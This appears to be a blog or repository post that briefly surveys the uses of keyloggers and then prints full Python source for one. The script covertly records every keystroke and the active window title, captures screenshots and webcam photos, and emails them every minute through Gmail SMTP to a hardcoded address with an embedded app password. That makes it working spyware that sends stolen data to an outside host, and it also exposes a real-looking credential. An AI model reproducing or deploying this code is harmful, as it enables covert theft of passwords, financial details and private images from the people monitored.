Keyloggers are covert software programs designed to surreptitiously record keystrokes on a computer or mobile device. Operating discreetly in the background, they capture every keystroke made by a user, including sensitive information like passwords, usernames, and credit card numbers. This technology finds application across a spectrum of contexts, ranging from legitimate to malicious purposes.
In the realm of legitimate use, keyloggers serve as valuable tools for surveillance and monitoring. Employers, for instance, may deploy them to track employee activities on company-owned devices, ensuring adherence to organizational policies and safeguarding against unauthorized actions. Likewise, parents may opt to utilize keyloggers to monitor their children's online behaviors, fostering a safer digital environment.
From a cybersecurity perspective, ethical hackers and security researchers leverage keyloggers to identify vulnerabilities in systems and bolster digital defenses. By simulating potential attack scenarios, they can proactively address weaknesses and enhance overall cybersecurity measures, thereby contributing to a safer online ecosystem.
However, the shadowy side of keyloggers emerges in the realm of cybercrime. Malicious actors exploit these tools to perpetrate various illicit activities, such as stealing sensitive information for identity theft, financial fraud, and other cybercrimes. Moreover, state actors and intelligence agencies may employ keyloggers as tools of espionage to clandestinely gather sensitive information from targeted individuals or organizations, raising significant concerns regarding privacy infringement and civil liberties.

# Keyloggers code 
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener, Button
import smtplib
import ssl
import win32gui
import pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import os
import time
import cv2

keys = []
start_time = time.time()

def on_press(key):
    global keys
    keys.append(key)
    check_and_send_report()

def on_click(x, y, button, pressed):
    if pressed and button == Button.right:
        take_and_send_screenshot_and_photo()

def check_and_send_report():
    global start_time
    elapsed_time = time.time() - start_time
    if elapsed_time >= 60:  # 1 minute in seconds
        log_to_file()
        email()
        reset_values()

def take_and_send_screenshot_and_photo():
    take_screenshot()
    take_photo()
    send_screenshot_and_photo_email()

def email():
    global keys
    global start_time
    
    message = ""
    for key in keys:
        if hasattr(key, 'char'):
            message += key.char
        elif key == Key.space:
            message += ' '
        elif key == Key.enter:
            message += '\n'
        else:
            # If the key is not printable or a special key, ignore it
            continue
    
    active_window_title = get_active_window_title()
    if active_window_title:
        message += f"\n\nActive Window Title: {active_window_title}"
    
    # Add a sentence indicating the time range for the captured keystrokes
    message += f"\n\nKeystrokes recorded from {time.strftime('%H:%M', time.localtime(start_time))} to {time.strftime('%H:%M', time.localtime(time.time()))}"

    sender_email = "mahankalikrishna01@gmail.com"
    receiver_email = "mahankalikrishna01@gmail.com"
    password = "stwi hhky zfsx amnt"  # Replace with your password
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = 'Keylogger Report'

    msg.attach(MIMEText(message, 'plain'))

    # Attach screenshot
    filename = 'screenshot.png'
    with open(filename, 'rb') as file:
        img_data = file.read()
    img_part = MIMEImage(img_data, name=os.path.basename(filename))
    msg.attach(img_part)

    # Attach webcam photo
    photo_filename = 'webcam_photo.png'
    with open(photo_filename, 'rb') as file:
        img_data = file.read()
    photo_part = MIMEImage(img_data, name=os.path.basename(photo_filename))
    msg.attach(photo_part)

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.send_message(msg)

def send_screenshot_and_photo_email():
    # Define this function to send the screenshot and webcam photo via email
    pass

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception as e:
        print("Error getting active window title:", e)
        return None

def on_release(key):
    if key == Key.esc:
        return False

def log_to_file():
    global keys
    active_window_title = get_active_window_title()
    with open('keylog.txt', 'a') as log:
        log.write("\n".join(map(str, keys)))
        if active_window_title:
            log.write(f"\nActive Window Title: {active_window_title}\n")

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
    except Exception as e:
        print("Error taking screenshot:", e)

def take_photo():
    try:
        # Open the webcam
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()

        # Save the captured frame
        cv2.imwrite("webcam_photo.png", frame)

        # Release the camera
        cap.release()
    except Exception as e:
        print("Error capturing webcam photo:", e)

def reset_values():
    global keys, start_time
    keys = []
    start_time = time.time()

with Listener(on_press=on_press, on_release=on_release) as listener:
    with MouseListener(on_click=on_click) as mouse_listener:
        listener.join()
